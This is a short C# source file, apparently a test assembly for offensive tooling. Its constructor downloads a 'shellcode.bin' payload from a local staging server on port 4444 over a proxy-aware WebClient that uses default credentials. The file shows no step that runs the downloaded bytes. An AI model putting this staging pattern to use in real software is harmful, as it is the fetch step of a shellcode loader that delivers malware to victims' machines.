using System.Net;


namespace TestAssembly
{
    public class Program
    {
        public Program()
        {
            byte[] shellcode;

            using (var client = new WebClient())
            {
                // make proxy aware
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.UseDefaultCredentials = true;

                // set allowed tls versions
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

                shellcode = client.DownloadData("http://localhost:4444/shellcode.bin");
            };
        }
    }
}
